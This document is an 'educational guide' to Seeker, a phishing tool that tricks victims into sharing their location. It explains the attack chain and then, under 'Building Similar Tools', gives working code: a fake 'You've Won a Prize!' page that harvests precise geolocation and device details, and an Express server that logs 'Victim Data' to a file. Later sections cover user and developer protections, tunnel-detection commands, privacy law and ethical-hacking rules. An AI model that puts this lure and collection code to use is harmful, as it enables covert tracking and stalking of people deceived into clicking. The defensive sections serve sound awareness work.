# How Seeker Works - Complete Educational Guide

## 📚 Part 1: How This Works

### The Attack Chain:

```
1. Attacker Setup
   └─> Seeker creates fake webpage (PHP server)
   └─> Exposes it via tunnel (ngrok/cloudflare)
   └─> Gets public URL

2. Social Engineering
   └─> Attacker sends link to victim
   └─> Uses believable story/context
   └─> Victim clicks the link

3. JavaScript Exploitation
   └─> Webpage loads in victim's browser
   └─> JavaScript requests location permission
   └─> Victim grants permission (thinking it's legitimate)

4. Data Collection
   └─> Browser APIs collect device info
   └─> Geolocation API gets precise coordinates
   └─> Data sent back to attacker's server

5. Information Gathering
   └─> Seeker logs all data
   └─> Performs IP reconnaissance
   └─> Generates Google Maps link
```

### Technical Components:

#### 1. **PHP Backend** (`seeker.py` + PHP files)
```python
# Seeker starts a PHP server
subprocess.Popen(['php', '-S', '0.0.0.0:9999', '-t', 'template/nearyou/'])
```

#### 2. **HTML/JavaScript Frontend** (template files)
```javascript
// Gets device information
navigator.platform      // OS
navigator.hardwareConcurrency  // CPU cores
screen.width/height     // Resolution
navigator.userAgent     // Browser details

// Gets location (requires user permission)
navigator.geolocation.getCurrentPosition(success, error, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
});
```

#### 3. **Data Transmission**
```javascript
// Sends data back to attacker via AJAX
fetch('/location', {
    method: 'POST',
    body: JSON.stringify({
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        accuracy: position.coords.accuracy
    })
});
```

#### 4. **IP Reconnaissance** (when public IP)
```python
# Seeker uses IP lookup APIs
# - ipapi.co
# - ip-api.com  
# Gets: ISP, Country, City, Organization, etc.
```

---

## 🛠️ Part 2: Building Similar Tools

### Basic Geolocation Tracker (HTML + JavaScript)

#### Step 1: Create `index.html`
```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: white;
            color: #333;
            padding: 30px;
            border-radius: 10px;
            max-width: 500px;
            margin: 0 auto;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 You've Won a Prize!</h1>
        <p>Click below to claim your reward!</p>
        <button onclick="getLocation()">Claim Prize</button>
        <div id="result"></div>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Collect device info
            const deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                latitude: lat,
                longitude: lon,
                accuracy: accuracy
            };

            // Send to backend (you would implement this)
            console.log('Collected Data:', deviceInfo);
            
            // For demo, show on page
            document.getElementById('result').innerHTML = `
                <h3>Data Collected:</h3>
                <p><strong>Location:</strong> ${lat}, ${lon}</p>
                <p><strong>Accuracy:</strong> ${accuracy}m</p>
                <p><strong>Device:</strong> ${deviceInfo.platform}</p>
            `;
        }

        function showError(error) {
            const errors = {
                1: 'Permission denied',
                2: 'Position unavailable',
                3: 'Timeout'
            };
            alert(errors[error.code]);
        }
    </script>
</body>
</html>
```

#### Step 2: Add Backend (Node.js example)
```javascript
// server.js
const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/log', (req, res) => {
    const data = req.body;
    console.log('Victim Data:', data);
    
    // Save to database/file
    fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
    
    res.json({ success: true });
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

---

## 🛡️ Part 3: Protection Strategies

### For Users:

#### 1. **Be Suspicious of Location Requests**
```
❌ Random website asking for location? → Deny
✅ Google Maps asking for location? → OK
❌ "Win a prize" page asking for location? → Deny
```

#### 2. **Check URLs Carefully**
```
❌ Suspicious: https://g00gle-maps.xyz
✅ Legitimate: https://www.google.com/maps
❌ Suspicious: https://abc123.ngrok.io
❌ Suspicious: bit.ly/xyz123 (shortened URLs)
```

#### 3. **Browser Settings**
```
Chrome: Settings → Privacy → Site Settings → Location
- Set to "Ask before accessing (recommended)"
- Review and remove suspicious sites

Safari: Preferences → Websites → Location
- Set to "Deny" for unknown sites

Firefox: Settings → Privacy & Security → Permissions → Location
- "Block new requests asking to access your location"
```

#### 4. **Use Browser Extensions**
- uBlock Origin (blocks tracking scripts)
- Privacy Badger (blocks trackers)
- NoScript (blocks JavaScript on untrusted sites)

#### 5. **VPN Usage**
```
✅ Hides real IP address
✅ Masks actual location
✅ Encrypts traffic
```

### For Developers:

#### 1. **Implement Proper Warnings**
```html
<button onclick="requestLocation()">
    ⚠️ This will share your precise location
</button>
```

#### 2. **Only Request When Necessary**
```javascript
// Bad: Request on page load
window.onload = () => navigator.geolocation.getCurrentPosition();

// Good: Request only when user initiates
button.onclick = () => navigator.geolocation.getCurrentPosition();
```

#### 3. **Use Coarse Location When Possible**
```javascript
// High accuracy (not always needed)
{ enableHighAccuracy: true }

// Low accuracy (city-level, less invasive)
{ enableHighAccuracy: false }
```

#### 4. **Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" 
      content="geolocation 'self'">
```

### For Organizations:

#### 1. **Security Awareness Training**
- Teach employees about social engineering
- Regular phishing simulations
- Location permission best practices

#### 2. **Network-Level Protection**
- Monitor for suspicious tunneling services (ngrok, cloudflare)
- Implement URL filtering
- Deploy endpoint protection

#### 3. **Mobile Device Management**
- Enforce location permission policies
- Audit app permissions regularly
- Restrict untrusted app installations

---

## 🔍 Detection Methods

### How to Detect Seeker-like Attacks:

#### 1. **Network Traffic Analysis**
```bash
# Look for connections to tunneling services
tcpdump -i any | grep -E 'ngrok|cloudflare|serveo'
```

#### 2. **Browser DevTools**
```javascript
// Check what scripts are running
console.log(document.scripts);

// Monitor network requests
// Open DevTools → Network tab
```

#### 3. **Indicators of Compromise (IOCs)**
- Suspicious geolocation requests on simple pages
- Multiple API calls to location services
- Data being sent to unusual domains
- PHP server headers from unexpected sources

---

## 📊 Data Privacy Laws

### Legal Considerations:

- **GDPR** (Europe): Requires explicit consent for location tracking
- **CCPA** (California): Users must be able to opt-out
- **POPIA** (South Africa): Personal info must be protected
- **Computer Fraud and Abuse Act** (USA): Unauthorized access is illegal

### Ethical Hacking Rules:
✅ Get written permission
✅ Define scope clearly
✅ Document everything
✅ Report findings responsibly
✅ Delete data after test
❌ Never use on strangers
❌ Never sell collected data
❌ Never use for stalking/harassment

---

## 🎓 Further Learning

### Recommended Resources:
1. **OWASP** - Web security testing guide
2. **PortSwigger Web Security Academy** - Free courses
3. **HackerOne** - Bug bounty platform for practice
4. **TryHackMe** / **HackTheBox** - Hands-on labs

### Related Tools to Explore:
- **BeEF** (Browser Exploitation Framework)
- **Social-Engineer Toolkit (SET)**
- **Metasploit** (for broader pentesting)
- **Burp Suite** (web app security testing)